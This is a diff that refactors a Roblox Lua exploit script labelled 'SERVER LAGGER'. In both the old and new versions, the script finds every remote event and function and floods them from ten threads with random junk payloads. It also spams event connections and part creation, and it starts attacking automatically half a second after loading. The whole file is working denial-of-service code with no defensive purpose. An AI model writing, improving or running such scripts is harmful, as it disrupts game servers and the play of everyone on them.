@@ -1,144 +1,212 @@
 local Players = game:GetService("Players")
-local RS = game:GetService("ReplicatedStorage")
-local lp = Players.LocalPlayer
-local sg = Instance.new("ScreenGui")
-sg.Parent = game.CoreGui
-local mf = Instance.new("Frame")
-mf.Parent = sg
-mf.Size = UDim2.new(0,250,0,150)
-mf.Position = UDim2.new(0.5,-125,0.5,-75)
-mf.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
-mf.Active = true
-mf.Draggable = true
-local tl = Instance.new("TextLabel")
-tl.Parent = mf
-tl.Size = UDim2.new(1,0,0,30)
-tl.BackgroundColor3 = Color3.new(0.2,0,0)
-tl.Text = "SERVER LAGGER"
-tl.TextColor3 = Color3.new(1,0.5,0.5)
-tl.Font = Enum.Font.Code
-local st = Instance.new("TextLabel")
-st.Parent = mf
-st.Position = UDim2.new(0,10,0,35)
-st.Size = UDim2.new(1,-20,0,40)
-st.BackgroundTransparency = 1
-st.Text = "READY"
-st.TextColor3 = Color3.new(0.5,1,0.5)
-st.Font = Enum.Font.Code
-st.TextXAlignment = Enum.TextXAlignment.Left
-local sb = Instance.new("TextButton")
-sb.Parent = mf
-sb.Position = UDim2.new(0.1,0,0,80)
-sb.Size = UDim2.new(0.35,0,0,30)
-sb.BackgroundColor3 = Color3.new(0.8,0.1,0.1)
-sb.Text = "START"
-sb.TextColor3 = Color3.new(1,1,1)
-sb.Font = Enum.Font.Code
-local eb = Instance.new("TextButton")
-eb.Parent = mf
-eb.Position = UDim2.new(0.55,0,0,80)
-eb.Size = UDim2.new(0.35,0,0,30)
-eb.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
-eb.Text = "STOP"
-eb.TextColor3 = Color3.new(1,1,1)
-eb.Font = Enum.Font.Code
-local cb = Instance.new("TextButton")
-cb.Parent = mf
-cb.Position = UDim2.new(1,-25,0,5)
-cb.Size = UDim2.new(0,20,0,20)
-cb.BackgroundColor3 = Color3.new(0.8,0.1,0.1)
-cb.Text = "X"
-cb.TextColor3 = Color3.new(1,1,1)
-cb.Font = Enum.Font.Code
-local active = false
-local threads = {}
-local remotes = {events={},functions={}}
-local function scan(f)
-    for _,o in pairs(f:GetChildren()) do
-        if o:IsA("RemoteEvent") then
-            table.insert(remotes.events,o)
-        elseif o:IsA("RemoteFunction") then
-            table.insert(remotes.functions,o)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local localPlayer = Players.LocalPlayer
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game:GetService("CoreGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 250, 0, 150)
+MainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+local Title = Instance.new("TextLabel")
+Title.Parent = MainFrame
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+Title.Text = "SERVER LAGGER"
+Title.TextColor3 = Color3.fromRGB(255, 100, 100)
+Title.Font = Enum.Font.Code
+
+local Status = Instance.new("TextLabel")
+Status.Parent = MainFrame
+Status.Position = UDim2.new(0, 10, 0, 35)
+Status.Size = UDim2.new(1, -20, 0, 40)
+Status.BackgroundTransparency = 1
+Status.Text = "SCANNING..."
+Status.TextColor3 = Color3.fromRGB(100, 255, 100)
+Status.Font = Enum.Font.Code
+Status.TextXAlignment = Enum.TextXAlignment.Left
+
+local StartButton = Instance.new("TextButton")
+StartButton.Parent = MainFrame
+StartButton.Position = UDim2.new(0.1, 0, 0, 80)
+StartButton.Size = UDim2.new(0.35, 0, 0, 30)
+StartButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+StartButton.Text = "START"
+StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StartButton.Font = Enum.Font.Code
+
+local StopButton = Instance.new("TextButton")
+StopButton.Parent = MainFrame
+StopButton.Position = UDim2.new(0.55, 0, 0, 80)
+StopButton.Size = UDim2.new(0.35, 0, 0, 30)
+StopButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+StopButton.Text = "STOP"
+StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StopButton.Font = Enum.Font.Code
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Parent = MainFrame
+CloseButton.Position = UDim2.new(1, -25, 0, 5)
+CloseButton.Size = UDim2.new(0, 20, 0, 20)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.Code
+
+local isActive = false
+local attackThreads = {}
+local remoteObjects = {events = {}, functions = {}}
+
+local function scanFolder(folder)
+    for _, child in pairs(folder:GetChildren()) do
+        if child:IsA("RemoteEvent") then
+            table.insert(remoteObjects.events, child)
+        elseif child:IsA("RemoteFunction") then
+            table.insert(remoteObjects.functions, child)
         end
-        scan(o)
+        
+        scanFolder(child)
     end
 end
-scan(RS)
-scan(workspace)
-scan(game.ServerScriptService)
-scan(game.ServerStorage)
-st.Text = "REMOTES: "..#remotes.events+..#remotes.functions
-local function pl()
-    local t = math.random(1,4)
-    if t==1 then return {string.rep("X",math.random(200,800))} end
-    if t==2 then return {math.random(1,9999999)} end
-    if t==3 then return {Vector3.new(math.random(),math.random(),math.random())} end
-    local tb={}
-    for i=1,math.random(10,50) do tb[i]=math.random() end
-    return {tb}
+
+scanFolder(ReplicatedStorage)
+scanFolder(Workspace)
+if game:GetService("ServerScriptService") then
+    scanFolder(game:GetService("ServerScriptService"))
 end
-local function start()
-    if active then return end
-    active=true
-    sb.BackgroundColor3=Color3.new(0.1,0.8,0.1)
-    sb.Text="RUNNING"
-    st.Text="ATTACKING"
-    local tc=10
-    for i=1,tc do
-        local th=task.spawn(function()
-            while active do
-                for _,r in pairs(remotes.events) do
-                    if not active then break end
-                    pcall(function() r:FireServer(unpack(pl())) end)
+if game:GetService("ServerStorage") then
+    scanFolder(game:GetService("ServerStorage"))
+end
+
+local remoteCount = #remoteObjects.events + #remoteObjects.functions
+Status.Text = "REMOTES: " .. remoteCount
+
+local function generatePayload()
+    local payloadType = math.random(1, 4)
+    
+    if payloadType == 1 then
+        return {string.rep("A", math.random(200, 500))}
+    elseif payloadType == 2 then
+        return {math.random(1, 1000000)}
+    elseif payloadType == 3 then
+        return {Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))}
+    else
+        local tableData = {}
+        for i = 1, math.random(10, 30) do
+            tableData[i] = math.random(1, 100)
+        end
+        return {tableData}
+    end
+end
+
+local function createConnectionSpam()
+    while isActive do
+        for i = 1, 10 do
+            pcall(function()
+                Workspace.ChildAdded:Connect(function() end)
+                game:GetService("Lighting").Changed:Connect(function() end)
+            end)
+        end
+        task.wait(0.05)
+    end
+end
+
+local function createPartSpam()
+    while isActive do
+        for i = 1, 5 do
+            pcall(function()
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(5, 5, 5)
+                part.Position = Vector3.new(
+                    math.random(-200, 200),
+                    math.random(10, 100),
+                    math.random(-200, 200)
+                )
+                part.Anchored = true
+                part.CanCollide = false
+                part.Transparency = 0.8
+                part.Parent = Workspace
+                
+                task.delay(3, function()
+                    if part and part.Parent then
+                        part:Destroy()
+                    end
+                end)
+            end)
+        end
+        task.wait(0.1)
+    end
+end
+
+local function startAttack()
+    if isActive then return end
+    
+    isActive = true
+    StartButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+    StartButton.Text = "RUNNING"
+    Status.Text = "ATTACKING"
+    
+    for threadId = 1, 10 do
+        local thread = task.spawn(function()
+            while isActive do
+                for _, remote in pairs(remoteObjects.events) do
+                    if not isActive then break end
+                    pcall(function()
+                        remote:FireServer(unpack(generatePayload()))
+                    end)
                 end
-                for _,r in pairs(remotes.functions) do
-                    if not active then break end
-                    pcall(function() r:InvokeServer(unpack(pl())) end)
+                
+                for _, remote in pairs(remoteObjects.functions) do
+                    if not isActive then break end
+                    pcall(function()
+                        remote:InvokeServer(unpack(generatePayload()))
+                    end)
                 end
+                
                 task.wait()
             end
         end)
-        table.insert(threads,th)
+        table.insert(attackThreads, thread)
     end
-    task.spawn(function()
-        while active do
-            for i=1,50 do
-                pcall(function()
-                    workspace.ChildAdded:Connect(function() end)
-                    game.Lighting.Changed:Connect(function() end)
-                end)
-            end
-            task.wait(0.1)
-        end
-    end)
-    task.spawn(function()
-        while active do
-            for i=1,20 do
-                pcall(function()
-                    local p=Instance.new("Part")
-                    p.Size=Vector3.new(10,10,10)
-                    p.Position=Vector3.new(math.random(-200,200),math.random(10,100),math.random(-200,200))
-                    p.Anchored=true
-                    p.CanCollide=false
-                    p.Parent=workspace
-                    game.Debris:AddItem(p,5)
-                end)
-            end
-            task.wait(0.05)
-        end
-    end)
+    
+    task.spawn(createConnectionSpam)
+    task.spawn(createPartSpam)
 end
-local function stop()
-    active=false
-    for _,t in pairs(threads) do pcall(task.cancel,t) end
-    threads={}
-    sb.BackgroundColor3=Color3.new(0.8,0.1,0.1)
-    sb.Text="START"
-    st.Text="STOPPED"
+
+local function stopAttack()
+    isActive = false
+    
+    for _, thread in pairs(attackThreads) do
+        pcall(task.cancel, thread)
+    end
+    attackThreads = {}
+    
+    StartButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    StartButton.Text = "START"
+    Status.Text = "STOPPED"
 end
-sb.MouseButton1Click:Connect(start)
-eb.MouseButton1Click:Connect(stop)
-cb.MouseButton1Click:Connect(function() stop() sg:Destroy() end)
-game.Players.PlayerRemoving:Connect(function(p) if p==lp then stop() pcall(function() sg:Destroy() end) end end)
+
+StartButton.MouseButton1Click:Connect(startAttack)
+StopButton.MouseButton1Click:Connect(stopAttack)
+
+CloseButton.MouseButton1Click:Connect(function()
+    stopAttack()
+    ScreenGui:Destroy()
+end)
+
+game:GetService("Players").PlayerRemoving:Connect(function(player)
+    if player == localPlayer then
+        stopAttack()
+        pcall(function() ScreenGui:Destroy() end)
+    end
+end)
+
 task.wait(0.5)
-start()
+startAttack()
